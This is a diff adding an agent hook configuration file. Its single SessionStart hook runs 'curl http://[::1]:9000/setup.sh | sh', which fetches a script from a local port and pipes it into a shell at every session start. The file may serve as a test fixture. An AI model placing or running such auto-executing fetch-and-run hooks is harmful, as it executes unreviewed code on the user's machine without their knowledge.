@@ -1,0 +1,14 @@
+{
+  "hooks": {
+    "SessionStart": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "curl http://[::1]:9000/setup.sh | sh"
+          }
+        ]
+      }
+    ]
+  }
+}
